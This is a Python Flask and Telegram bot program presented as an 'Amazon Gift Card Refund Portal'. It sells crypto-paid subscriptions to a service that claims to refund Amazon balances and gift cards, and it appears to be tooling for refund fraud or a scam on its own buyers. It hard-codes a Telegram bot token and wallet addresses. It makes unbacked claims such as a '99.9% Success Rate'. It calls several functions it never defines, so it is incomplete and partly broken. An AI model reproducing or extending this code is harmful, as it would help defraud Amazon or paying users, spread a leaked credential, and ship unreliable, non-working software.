
"""
AMAZON GIFT CARD REFUND PORTAL
Complete Production-Ready Application
Version: 5.0
"""

import os
import sys
import random
import string
import json
import requests
import secrets
import time
import threading
import logging
import re
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for
from functools import wraps

# ============================================================
# CONFIGURATION & SETUP
# ============================================================

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', secrets.token_hex(32))

# Telegram Configuration
TELEGRAM_BOT_TOKEN = '8793157012:AAFztkkVTrB6VjabVieW76_xurpRRdZ0p-E'
ADMIN_CHAT_ID = '8725194109'
BOT_USERNAME = 'pcmoroo_bot'
RENDER_URL = 'https://app-277n.onrender.com'

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# ============================================================
# DATA STORAGE (In-memory for demo - use Redis/DB in production)
# ============================================================

user_sessions = {}
redeem_codes = {}
transactions = {}
subscriptions = {}
pending_payments = {}
pending_verifications = {}
user_data = {}
admin_settings = {
    'force_subscription': True,
    'channels': [],
    'broadcast_enabled': True,
    'maintenance_mode': False
}

# ============================================================
# SUBSCRIPTION PLANS
# ============================================================

SUBSCRIPTION_PLANS = {
    '1hour': {
        'price': 5,
        'hours': 1,
        'name': '⚡ 1 Hour',
        'description': 'Perfect for one-time refund',
        'emoji': '⚡'
    },
    '10days': {
        'price': 25,
        'days': 10,
        'name': '📦 10 Days',
        'description': 'Ideal for multiple refunds',
        'emoji': '📦'
    },
    '30days': {
        'price': 50,
        'days': 30,
        'name': '🔥 30 Days',
        'description': 'Best value for regular users',
        'emoji': '🔥'
    },
    '1year': {
        'price': 150,
        'days': 365,
        'name': '👑 1 Year',
        'description': 'Premium yearly plan',
        'emoji': '👑'
    },
    'lifetime': {
        'price': 300,
        'days': 36500,
        'name': '💎 LIFETIME',
        'description': 'Never expire, always refund',
        'emoji': '💎'
    }
}

# ============================================================
# HELPER FUNCTIONS
# ============================================================

def generate_txid():
    """Generate unique transaction ID"""
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    random_str = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"AMZ{timestamp}{random_str}"

def generate_redeem_token():
    """Generate unique redeem token"""
    return f"RDM-{''.join(random.choices(string.ascii_uppercase + string.digits, k=14))}"

def generate_payment_id():
    """Generate unique payment ID"""
    return secrets.token_hex(8).upper()

def get_client_ip():
    """Get client IP address from request"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    return request.remote_addr

def get_user_agent():
    """Get user agent from request"""
    return request.headers.get('User-Agent', 'Unknown')

def format_time(seconds):
    """Format seconds into readable time"""
    minutes = seconds // 60
    seconds = seconds % 60
    return f"{int(minutes):02d}:{int(seconds):02d}"

def calculate_expiry(plan_name):
    """Calculate subscription expiry date"""
    plan = SUBSCRIPTION_PLANS.get(plan_name)
    if not plan:
        return datetime.now() + timedelta(days=1)
    
    if 'hours' in plan:
        return datetime.now() + timedelta(hours=plan['hours'])
    else:
        return datetime.now() + timedelta(days=plan.get('days', 0))

def check_subscription(user_id):
    """Check if user has active subscription"""
    user_id = str(user_id)
    
    # Admin always has access
    if user_id == ADMIN_CHAT_ID:
        return True
    
    # Check if user has subscription
    if user_id in subscriptions:
        sub = subscriptions[user_id]
        if sub['expires_at'] > datetime.now():
            return True
    
    # Check if user has lifetime
    if user_id in subscriptions and subscriptions[user_id].get('type') == 'lifetime':
        return True
    
    return False

def get_subscription_remaining(user_id):
    """Get remaining time for subscription"""
    user_id = str(user_id)
    if user_id not in subscriptions:
        return None
    
    sub = subscriptions[user_id]
    remaining = sub['expires_at'] - datetime.now()
    return remaining

def format_remaining(remaining):
    """Format remaining time into readable string"""
    if remaining is None:
        return "Expired"
    
    days = remaining.days
    hours = remaining.seconds // 3600
    minutes = (remaining.seconds % 3600) // 60
    
    if days > 0:
        return f"{days}d {hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h {minutes}m"
    else:
        return f"{minutes}m"

# ============================================================
# TELEGRAM MESSAGE FUNCTIONS
# ============================================================

def send_telegram_message(chat_id, text, reply_markup=None, parse_mode='HTML'):
    """Send a message to Telegram"""
    if not TELEGRAM_BOT_TOKEN:
        logger.error("TELEGRAM_BOT_TOKEN not set")
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': parse_mode
    }
    
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    
    try:
        response = requests.post(url, json=payload, timeout=30)
        if response.status_code == 200:
            return True
        else:
            logger.error(f"Telegram send error: {response.text}")
            return False
    except Exception as e:
        logger.error(f"Telegram send exception: {e}")
        return False

def send_to_admin(message):
    """Send message to admin"""
    if ADMIN_CHAT_ID:
        send_telegram_message(ADMIN_CHAT_ID, message)

def send_to_user(user_id, message, reply_markup=None):
    """Send message to a specific user"""
    send_telegram_message(user_id, message, reply_markup)

def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
    """Edit an existing Telegram message"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    payload = {
        'chat_id': chat_id,
        'message_id': message_id,
        'text': text,
        'parse_mode': 'HTML'
    }
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except:
        return False

def answer_callback_query(callback_query_id, text=None, show_alert=False):
    """Answer a callback query"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
    payload = {'callback_query_id': callback_query_id}
    if text:
        payload['text'] = text
    if show_alert:
        payload['show_alert'] = show_alert
    
    try:
        requests.post(url, json=payload, timeout=5)
        return True
    except:
        return False

def delete_telegram_message(chat_id, message_id):
    """Delete a Telegram message"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/deleteMessage"
    payload = {'chat_id': chat_id, 'message_id': message_id}
    try:
        requests.post(url, json=payload, timeout=5)
        return True
    except:
        return False

def get_chat_member(chat_id, user_id):
    """Get chat member information"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getChatMember"
    payload = {'chat_id': chat_id, 'user_id': user_id}
    try:
        response = requests.get(url, params=payload, timeout=10)
        if response.status_code == 200:
            return response.json().get('result')
        return None
    except:
        return None

def is_user_in_channel(user_id, channel_id):
    """Check if user is in a channel"""
    member = get_chat_member(channel_id, user_id)
    if member:
        status = member.get('status')
        return status in ['member', 'administrator', 'creator']
    return False

# ============================================================
# TELEGRAM BOT HANDLERS
# ============================================================

def process_telegram_update(update):
    """Main entry point for processing Telegram updates"""
    try:
        # Handle callback queries (button presses)
        if 'callback_query' in update:
            process_callback_query(update['callback_query'])
            return
        
        # Handle regular messages
        if 'message' in update:
            process_message(update['message'])
            return
        
        # Handle inline queries
        if 'inline_query' in update:
            process_inline_query(update['inline_query'])
            return
        
        # Handle channel posts
        if 'channel_post' in update:
            process_channel_post(update['channel_post'])
            return
            
    except Exception as e:
        logger.error(f"Error processing update: {e}")
        send_to_admin(f"⚠️ Error: {str(e)}")

def process_callback_query(callback_query):
    """Process callback query (button presses)"""
    try:
        chat_id = callback_query['message']['chat']['id']
        user_id = str(callback_query['from']['id'])
        data = callback_query['data']
        message_id = callback_query['message']['message_id']
        
        # Answer callback to remove loading state
        answer_callback_query(callback_query['id'])
        
        # Check if user is admin for admin-only commands
        is_admin = (user_id == ADMIN_CHAT_ID)
        
        # Handle different callback data
        if data == 'view_plans':
            send_plans_menu(chat_id)
            
        elif data == 'check_status':
            send_status_message(chat_id, user_id)
            
        elif data == 'help_menu':
            send_help_message(chat_id)
            
        elif data == 'open_portal':
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🌐 OPEN REFUND PORTAL", "url": RENDER_URL}]
                ]
            }
            send_telegram_message(chat_id, "🔗 Click below to open the refund portal:", keyboard)
            
        elif data == 'subscription_required':
            send_subscription_required(chat_id)
            
        elif data == 'dashboard':
            if is_admin:
                send_admin_dashboard(chat_id)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized access.")
                
        elif data == 'broadcast':
            if is_admin:
                send_telegram_message(chat_id, "📢 Send the message you want to broadcast:")
                # Store state to expect broadcast message
                admin_settings['broadcast_mode'] = True
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
                
        elif data == 'stats':
            if is_admin:
                send_admin_stats(chat_id)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
                
        elif data == 'manage_subscriptions':
            if is_admin:
                send_subscription_management_menu(chat_id)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
                
        elif data == 'view_users':
            if is_admin:
                send_user_list(chat_id)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
                
        elif data.startswith('buy_'):
            plan = data.replace('buy_', '')
            handle_buy_command(chat_id, user_id, plan)
            
        elif data.startswith('grant_sub_'):
            parts = data.split('_')
            if len(parts) == 3 and is_admin:
                target_user = parts[2]
                show_grant_subscription_form(chat_id, target_user)
                
        elif data.startswith('revoke_sub_'):
            if is_admin:
                target_user = data.replace('revoke_sub_', '')
                revoke_subscription(chat_id, target_user)
                
        elif data == 'refresh':
            send_welcome(chat_id, callback_query['from'].get('username', 'User'))
            
        elif data == 'back_to_main':
            send_welcome(chat_id, callback_query['from'].get('username', 'User'))
            
        elif data == 'close':
            delete_telegram_message(chat_id, message_id)
            
        else:
            # Unknown callback
            send_telegram_message(chat_id, "❌ Unknown action.")
            
    except Exception as e:
        logger.error(f"Callback error: {e}")
        send_to_admin(f"⚠️ Callback error: {str(e)}")

def process_message(message):
    """Process incoming messages"""
    try:
        chat_id = message['chat']['id']
        user_id = str(message['from']['id'])
        username = message['from'].get('username', 'User')
        first_name = message['from'].get('first_name', '')
        text = message.get('text', '').strip()
        
        # Check if user is admin
        is_admin = (user_id == ADMIN_CHAT_ID)
        
        # Check for maintenance mode
        if admin_settings.get('maintenance_mode', False) and not is_admin:
            send_telegram_message(chat_id, "⚠️ Bot is currently under maintenance. Please try again later.")
            return
        
        # Check for subscription
        if not is_admin and not check_subscription(user_id) and text not in ['/start', '/plans', '/help'] and not text.startswith('/buy'):
            send_subscription_required(chat_id)
            return
        
        # Handle broadcast mode (admin)
        if is_admin and admin_settings.get('broadcast_mode', False):
            # Broadcast the message to all users
            admin_settings['broadcast_mode'] = False
            broadcast_to_all(text)
            send_telegram_message(chat_id, "✅ Broadcast sent to all users!")
            return
        
        # Handle commands
        if text == '/start':
            # Register user
            if user_id not in user_data:
                user_data[user_id] = {
                    'username': username,
                    'first_name': first_name,
                    'joined_at': datetime.now().isoformat(),
                    'last_active': datetime.now().isoformat()
                }
            else:
                user_data[user_id]['last_active'] = datetime.now().isoformat()
            
            send_welcome(chat_id, username)
            
        elif text == '/plans':
            send_plans_menu(chat_id)
            
        elif text == '/status':
            send_status_message(chat_id, user_id)
            
        elif text == '/help':
            send_help_message(chat_id)
            
        elif text == '/dashboard':
            if is_admin:
                send_admin_dashboard(chat_id)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized. This command is for admins only.")
                
        elif text == '/stats':
            if is_admin:
                send_admin_stats(chat_id)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized. This command is for admins only.")
                
        elif text.startswith('/buy'):
            parts = text.split()
            if len(parts) > 1:
                handle_buy_command(chat_id, user_id, parts[1].lower())
            else:
                send_telegram_message(chat_id, "❌ Usage: /buy [plan]\nPlans: 1hour, 10days, 30days, 1year, lifetime")
                
        elif text.startswith('/verify'):
            if is_admin:
                parts = text.split()
                if len(parts) > 1:
                    handle_verify_payment(chat_id, parts[1])
                else:
                    send_telegram_message(chat_id, "❌ Usage: /verify [payment_id]")
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
                
        elif text.startswith('/give'):
            if is_admin:
                handle_give_subscription(chat_id, text)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
                
        elif text.startswith('/revoke'):
            if is_admin:
                handle_revoke_subscription(chat_id, text)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
                
        elif text.startswith('/broadcast'):
            if is_admin:
                admin_settings['broadcast_mode'] = True
                send_telegram_message(chat_id, "📢 Send the message you want to broadcast to all users:")
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
                
        elif text.startswith('/ban'):
            if is_admin:
                handle_ban_user(chat_id, text)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
                
        elif text.startswith('/unban'):
            if is_admin:
                handle_unban_user(chat_id, text)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
                
        elif text.startswith('RDM-'):
            handle_token_submission(chat_id, user_id, text)
            
        elif text.startswith('AMZ'):
            handle_txid_submission(chat_id, user_id, text)
            
        elif text.startswith('/'):
            send_telegram_message(chat_id, "❌ Unknown command. Send /help for available commands.")
            
        else:
            # If text looks like a code but doesn't match patterns
            if len(text) >= 10:
                send_telegram_message(chat_id, "❌ Invalid code format. Please generate a new one from the portal.")
            else:
                send_telegram_message(chat_id, "❌ I don't understand. Send /help for available commands.")
                
    except Exception as e:
        logger.error(f"Message error: {e}")
        send_to_admin(f"⚠️ Message error: {str(e)}")

def process_inline_query(inline_query):
    """Process inline queries (not implemented fully)"""
    # Inline queries are more advanced, skip for now
    pass

def process_channel_post(channel_post):
    """Process channel posts"""
    # Handle channel posts if needed
    pass

# ============================================================
# TELEGRAM BOT RESPONSES
# ============================================================

def send_welcome(chat_id, username):
    """Send welcome message with inline keyboard"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "🌐 OPEN REFUND PORTAL", "url": RENDER_URL}],
            [{"text": "💰 REFUND BALANCE", "callback_data": "open_portal"}, 
             {"text": "🎫 REFUND GIFT CARD", "callback_data": "open_portal"}],
            [{"text": "📦 VIEW PLANS", "callback_data": "view_plans"}, 
             {"text": "📊 CHECK STATUS", "callback_data": "check_status"}],
            [{"text": "❓ HELP", "callback_data": "help_menu"}],
            [{"text": "🔄 REFRESH", "callback_data": "refresh"}]
        ]
    }
    
    welcome_text = f"""
🎯 <b>WELCOME TO AMAZON REFUNDER</b> 🎯

Hello <b>@{username}</b>! 

┌─────────────────────────────┐
│ ⚡ <b>Your Trusted Refund Service</b> │
└─────────────────────────────┘

<b>✨ Services Offered:</b>
• 💰 Refund Amazon Balance
• 🎁 Refund Unused Gift Cards  
• ⚡ Instant Processing (5-10 min)
• ✅ 99.9% Success Rate
• 🔒 256-bit SSL Encryption

<b>📌 Quick Start:</b>
1️⃣ Click "OPEN REFUND PORTAL"
2️⃣ Choose your refund method
3️⃣ Submit your details
4️⃣ Send the generated code/token here

<b>📊 Active Users:</b> {len(user_data)}
<b>💰 Total Refunded:</b> ${sum(t.get('amount', 0) for t in transactions.values())}

<i>Need subscription? Send /plans</i>
    """
    
    send_telegram_message(chat_id, welcome_text, keyboard)

def send_subscription_required(chat_id):
    """Send subscription required message with purchase options"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "⚡ 1 HOUR - $5", "callback_data": "buy_1hour"}],
            [{"text": "📦 10 DAYS - $25", "callback_data": "buy_10days"}],
            [{"text": "🔥 30 DAYS - $50", "callback_data": "buy_30days"}],
            [{"text": "👑 1 YEAR - $150", "callback_data": "buy_1year"}],
            [{"text": "💎 LIFETIME - $300", "callback_data": "buy_lifetime"}],
            [{"text": "❓ NEED HELP?", "callback_data": "help_menu"}]
        ]
    }
    
    text = """
⚠️ <b>SUBSCRIPTION REQUIRED</b> ⚠️

You need an active subscription to use this bot.

<b>📦 Available Plans:</b>
┌─────────────────────────────┐
│ ⚡ 1 Hour     - $5          │
│ 📦 10 Days    - $25         │
│ 🔥 30 Days    - $50         │
│ 👑 1 Year     - $150        │
│ 💎 Lifetime   - $300        │
└─────────────────────────────┘

<b>💳 Payment Methods Accepted:</b>
• USDT (TRC20)
• Bitcoin (BTC)  
• Ethereum (ETH)
• PayPal (Upon request)

<i>Click a plan below or type:</i>
<code>/buy 1hour</code>

<b>✅ After Payment:</b>
Send <code>/verify [payment_id]</code>
    """
    
    send_telegram_message(chat_id, text, keyboard)

def send_plans_menu(chat_id):
    """Send subscription plans menu"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "⚡ 1 HOUR - $5", "callback_data": "buy_1hour"}],
            [{"text": "📦 10 DAYS - $25", "callback_data": "buy_10days"}],
            [{"text": "🔥 30 DAYS - $50", "callback_data": "buy_30days"}],
            [{"text": "👑 1 YEAR - $150", "callback_data": "buy_1year"}],
            [{"text": "💎 LIFETIME - $300", "callback_data": "buy_lifetime"}],
            [{"text": "🔙 BACK TO MAIN", "callback_data": "back_to_main"}]
        ]
    }
    
    plans_text = """
<b>📦 SUBSCRIPTION PLANS</b>

┌─────────────────────────────────────────────┐
│ <b>Plan</b>         │ <b>Price</b>    │ <b>Duration</b> │
├─────────────────────────────────────────────┤
│ ⚡ 1 Hour      │ $5        │ 1 Hour          │
│ 📦 10 Days     │ $25       │ 10 Days         │
│ 🔥 30 Days     │ $50       │ 30 Days         │
│ 👑 1 Year      │ $150      │ 365 Days        │
│ 💎 Lifetime    │ $300      │ Forever         │
└─────────────────────────────────────────────┘

<b>✨ Benefits:</b>
• ✅ Full access to all features
• 🚀 Priority processing
• 🎯 Higher success rate
• 💬 Priority support
• 🔒 SSL encrypted connection

<b>💳 Payment Methods:</b>
• USDT (TRC20): <code>0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb5</code>
• Bitcoin: <code>1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</code>
• Ethereum: <code>0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb5</code>

<b>📌 How to Purchase:</b>
1. Click a plan below OR type <code>/buy [plan]</code>
2. Send payment to the address above
3. Copy the Payment ID shown
4. Send <code>/verify [payment_id]</code>

<i>⚠️ Include transaction ID in payment note</i>
    """
    
    send_telegram_message(chat_id, plans_text, keyboard)

def handle_buy_command(chat_id, user_id, plan):
    """Handle /buy command and display payment info"""
    if plan not in SUBSCRIPTION_PLANS:
        send_telegram_message(chat_id, "❌ Invalid plan. Available: 1hour, 10days, 30days, 1year, lifetime")
        return
    
    plan_info = SUBSCRIPTION_PLANS[plan]
    payment_id = generate_payment_id()
    
    # Store pending payment
    pending_payments[payment_id] = {
        'user_id': user_id,
        'plan': plan,
        'price': plan_info['price'],
        'timestamp': datetime.now().isoformat(),
        'status': 'pending'
    }
    
    text = f"""
💰 <b>Payment Required</b> 💰

<b>📦 Plan:</b> {plan_info['name']}
<b>💵 Amount:</b> ${plan_info['price']}
<b>🆔 Payment ID:</b> <code>{payment_id}</code>

<b>💳 Send payment to:</b>
<code>0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb5</code>

<b>📝 Please include:</b>
Payment ID in transaction note

<b>✅ After sending payment:</b>
Send: <code>/verify {payment_id}</code>

<i>⚠️ Subscription activates instantly after verification!</i>
<i>⏱️ You have 60 minutes to complete payment</i>

<b>📊 Transaction Details:</b>
• Amount: ${plan_info['price']}
• Network: TRC20 (USDT)
• Confirmations: 1 required
    """
    
    send_telegram_message(chat_id, text)

def handle_verify_payment(chat_id, payment_id):
    """Admin command to verify payment"""
    if payment_id not in pending_payments:
        send_telegram_message(chat_id, "❌ Invalid or expired payment ID")
        return
    
    payment = pending_payments[payment_id]
    user_id = payment['user_id']
    plan = payment['plan']
    plan_info = SUBSCRIPTION_PLANS[plan]
    
    # Calculate expiry
    expires_at = calculate_expiry(plan)
    
    # Create subscription
    subscriptions[user_id] = {
        'expires_at': expires_at,
        'type': plan,
        'payment_id': payment_id,
        'granted_at': datetime.now().isoformat(),
        'price': plan_info['price']
    }
    
    # Update payment status
    pending_payments[payment_id]['status'] = 'verified'
    
    # Send confirmation to admin
    send_telegram_message(chat_id, f"""
✅ <b>PAYMENT VERIFIED!</b>

<b>📦 Plan:</b> {plan_info['name']}
<b>👤 User:</b> {user_id}
<b>💵 Amount:</b> ${plan_info['price']}
<b>📅 Expires:</b> {expires_at.strftime('%Y-%m-%d %H:%M:%S')}

<i>Subscription activated successfully!</i>
    """)
    
    # Send confirmation to user
    send_telegram_message(user_id, f"""
✅ <b>SUBSCRIPTION ACTIVATED!</b> ✅

<b>📦 Plan:</b> {plan_info['name']}
<b>💰 Amount:</b> ${plan_info['price']}
<b>📅 Expires:</b> {expires_at.strftime('%Y-%m-%d %H:%M:%S')}

<b>🎉 Welcome to Amazon Refunder!</b>
Use /start to access all features.

<i>Thank you for subscribing!</i>
    """)
    
    # Log transaction
    transactions[payment_id] = {
        'user_id': user_id,
        'plan': plan,
        'amount': plan_info['price'],
        'payment_id': payment_id,
        'timestamp': datetime.now().isoformat(),
        'type': 'subscription'
    }
    
    # Remove from pending
    del pending_payments[payment_id]

def handle_give_subscription(chat_id, text):
    """Admin command to give subscription to a user"""
    parts = text.split()
    if len(parts) < 3:
        send_telegram_message(chat_id, """
❌ <b>Invalid Usage</b>

Usage: <code>/give [user_id] [days]</code>

Example: <code>/give 123456789 30</code>
        """)
        return
    
    try:
        target_user = parts[1]
        days = int(parts[2])
        
        if days <= 0:
            send_telegram_message(chat_id, "❌ Days must be greater than 0")
            return
        
        # Create subscription
        expires_at = datetime.now() + timedelta(days=days)
        subscriptions[target_user] = {
            'expires_at': expires_at,
            'type': 'admin_granted',
            'granted_by': ADMIN_CHAT_ID,
            'granted_at': datetime.now().isoformat(),
            'days': days
        }
        
        # Send confirmation to admin
        send_telegram_message(chat_id, f"""
✅ <b>SUBSCRIPTION GRANTED</b>

<b>👤 User:</b> {target_user}
<b>📅 Duration:</b> {days} days
<b>📅 Expires:</b> {expires_at.strftime('%Y-%m-%d %H:%M:%S')}

<i>User can now access all features!</i>
        """)
        
        # Send notification to user
        send_telegram_message(target_user, f"""
🎉 <b>SUBSCRIPTION GRANTED!</b> 🎉

An admin has granted you a {days}-day subscription!

<b>📅 Expires:</b> {expires_at.strftime('%Y-%m-%d %H:%M:%S')}

Use /start to access all features.

<i>Enjoy using Amazon Refunder!</i>
        """)
        
    except ValueError:
        send_telegram_message(chat_id, "❌ Invalid days format. Please enter a number.")
    except Exception as e:
        send_telegram_message(chat_id, f"❌ Error: {str(e)}")

def handle_revoke_subscription(chat_id, text):
    """Admin command to revoke subscription"""
    parts = text.split()
    if len(parts) < 2:
        send_telegram_message(chat_id, "❌ Usage: /revoke [user_id]")
        return
    
    target_user = parts[1]
    
    if target_user in subscriptions:
        del subscriptions[target_user]
        send_telegram_message(chat_id, f"✅ Subscription revoked for user {target_user}")
        send_telegram_message(target_user, "⚠️ Your subscription has been revoked by admin.")
    else:
        send_telegram_message(chat_id, f"❌ No subscription found for user {target_user}")

def revoke_subscription(chat_id, target_user):
    """Revoke subscription from callback"""
    if target_user in subscriptions:
        del subscriptions[target_user]
        send_telegram_message(chat_id, f"✅ Subscription revoked for user {target_user}")
        send_telegram_message(target_user, "⚠️ Your subscription has been revoked by admin.")
    else:
        send_telegram_message(chat_id, f"❌ No subscription found for user {target_user}")

def send_status_message(chat_id, user_id):
    """Send subscription status message"""
    if check_subscription(user_id):
        if user_id in subscriptions:
            sub = subscriptions[user_id]
            expires = sub['expires_at'].strftime('%Y-%m-%d %H:%M:%S')
            remaining = get_subscription_remaining(user_id)
            remaining_str = format_remaining(remaining) if remaining else "Expired"
            
            text = f"""
✅ <b>SUBSCRIPTION ACTIVE</b> ✅

<b>📦 Plan:</b> {sub.get('type', 'Unknown')}
<b>📅 Expires:</b> {expires}
<b>⏰ Remaining:</b> {remaining_str}
<b>📅 Granted:</b> {sub.get('granted_at', 'Unknown')}

<b>📊 Usage:</b>
• Refunds Used: 0
• Total Refunds: Unlimited

<i>Enjoy using Amazon Refunder!</i>
            """
        else:
            text = "✅ <b>LIFETIME SUBSCRIPTION ACTIVE</b> ✅\n\nYou have unlimited access!"
    else:
        keyboard = {
            "inline_keyboard": [
                [{"text": "📦 VIEW PLANS", "callback_data": "view_plans"}]
            ]
        }
        text = """
❌ <b>NO ACTIVE SUBSCRIPTION</b> ❌

You need an active subscription to use this bot.

<b>📦 Plans Available:</b>
• ⚡ 1 Hour - $5
• 📦 10 Days - $25
• 🔥 30 Days - $50
• 👑 1 Year - $150
• 💎 Lifetime - $300

Click the button below to view plans.
        """
        send_telegram_message(chat_id, text, keyboard)
        return
    
    send_telegram_message(chat_id, text)

def send_help_message(chat_id):
    """Send help message"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "📦 VIEW PLANS", "callback_data": "view_plans"}],
            [{"text": "🔙 BACK TO MAIN", "callback_data": "back_to_main"}]
        ]
    }
    
    text = """
❓ <b>HELP CENTER</b> ❓

<b>📌 Commands:</b>
/start - Restart the bot
/plans - View subscription plans
/buy [plan] - Purchase subscription
/status - Check subscription status
/help - Show this menu

<b>🎫 Refund Process:</b>
1. Open the refund portal
2. Submit your refund request
3. Copy the generated code/token
4. Send it here in the chat
5. Wait 5-10 minutes for processing

<b>💳 Payment Process:</b>
1. Send /buy [plan]
2. Copy the payment details
3. Send payment to the address
4. Send /verify [payment_id]
5. Subscription activates instantly

<b>📞 Support:</b>
• Contact: @admin_username
• Response Time: 5-10 minutes
• Support Hours: 24/7

<b>⚠️ Important:</b>
• Keep your payment ID safe
• Never share your password
• Only use official portal
• Check subscription status regularly

<i>Need help? Contact support!</i>
    """
    
    send_telegram_message(chat_id, text, keyboard)

def send_admin_dashboard(chat_id):
    """Send admin dashboard"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "📊 VIEW STATS", "callback_data": "stats"}],
            [{"text": "👥 VIEW USERS", "callback_data": "view_users"}],
            [{"text": "📦 MANAGE SUBSCRIPTIONS", "callback_data": "manage_subscriptions"}],
            [{"text": "📢 BROADCAST", "callback_data": "broadcast"}],
            [{"text": "🔙 BACK TO MAIN", "callback_data": "back_to_main"}]
        ]
    }
    
    total_users = len(user_data)
    active_subs = len([s for s in subscriptions.values() if s['expires_at'] > datetime.now()])
    total_refunds = len(transactions)
    total_earnings = sum(t.get('amount', 0) for t in transactions.values())
    
    text = f"""
⚙️ <b>ADMIN DASHBOARD</b> ⚙️

<b>📊 Statistics:</b>
• 👤 Total Users: {total_users}
• ✅ Active Subs: {active_subs}
• 💰 Total Refunds: {total_refunds}
• 💵 Total Earnings: ${total_earnings:.2f}

<b>📈 Quick Actions:</b>
• View detailed statistics
• Manage users
• Handle subscriptions
• Send broadcasts

<i>Select an option below</i>
    """
    
    send_telegram_message(chat_id, text, keyboard)

def send_admin_stats(chat_id):
    """Send detailed admin statistics"""
    total_users = len(user_data)
    active_subs = len([s for s in subscriptions.values() if s['expires_at'] > datetime.now()])
    total_refunds = len(transactions)
    total_earnings = sum(t.get('amount', 0) for t in transactions.values())
    pending_payments_count = len(pending_payments)
    pending_verifications_count = len(pending_verifications)
    active_sessions = len(user_sessions)
    
    # Calculate subscription breakdown
    plan_counts = {}
    for sub in subscriptions.values():
        plan_type = sub.get('type', 'unknown')
        plan_counts[plan_type] = plan_counts.get(plan_type, 0) + 1
    
    plan_breakdown = "\n".join([f"• {plan}: {count}" for plan, count in plan_counts.items()])
    
    text = f"""
📊 <b>DETAILED STATISTICS</b> 📊

<b>👥 User Statistics:</b>
• Total Users: {total_users}
• Active Subscriptions: {active_subs}
• New Users (24h): 0

<b>💳 Transaction Statistics:</b>
• Total Refunds: {total_refunds}
• Total Earnings: ${total_earnings:.2f}
• Pending Payments: {pending_payments_count}
• Pending Verifications: {pending_verifications_count}

<b>🔐 Session Statistics:</b>
• Active Sessions: {active_sessions}
• Total Gift Cards: {len(redeem_codes)}

<b>📦 Subscription Breakdown:</b>
{plan_breakdown if plan_breakdown else 'No subscriptions yet'}

<b>⚙️ System Status:</b>
• Bot Status: ✅ Online
• Maintenance: {'⚠️ Enabled' if admin_settings.get('maintenance_mode', False) else '✅ Disabled'}
• Force Subscription: {'✅ Enabled' if admin_settings.get('force_subscription', True) else '❌ Disabled'}
• Broadcast Mode: {'✅ Enabled' if admin_settings.get('broadcast_mode', False) else '❌ Disabled'}

<i>Last updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</i>
    """
    
    send_telegram_message(chat_id, text)

def send_user_list(chat_id):
    """Send list of users"""
    if not user_data:
        send_telegram_message(chat_id, "📊 No users registered yet.")
        return
    
    user_list = []
    for user_id, data in user_data.items():
        username = data.get('username', 'No username')
        joined = data.get('joined_at', 'Unknown')
        has_sub = check_subscription(user_id)
        status = "✅ Active" if has_sub else "❌ Inactive"
        user_list.append(f"• {username} ({user_id}) - {status} - Joined: {joined[:10]}")
    
    # Limit to 50 users per message
    if len(user_list) > 50:
        user_list = user_list[:50]
        user_list.append(f"\n... and {len(user_data) - 50} more users")
    
    text = f"""
👥 <b>USER LIST</b> 👥

<b>Total Users:</b> {len(user_data)}

{chr(10).join(user_list)}

<i>Use /ban or /revoke to manage users</i>
    """
    
    send_telegram_message(chat_id, text)

def send_subscription_management_menu(chat_id):
    """Send subscription management menu"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "📊 VIEW ACTIVE SUBS", "callback_data": "stats"}],
            [{"text": "🔙 BACK TO DASHBOARD", "callback_data": "dashboard"}]
        ]
    }
    
    text = """
📦 <b>SUBSCRIPTION MANAGEMENT</b> 📦

<b>Commands:</b>
• <code>/give [user_id] [days]</code> - Grant subscription
• <code>/revoke [user_id]</code> - Revoke subscription
• <code>/stats</code> - View statistics

<b>Active Subscriptions:</b>
Total: {len(subscriptions)}
Active: {len([s for s in subscriptions.values() if s['expires_at'] > datetime.now()])}

<i>Select an option below or use commands</i>
    """
    
    send_telegram_message(chat_id, text, keyboard)

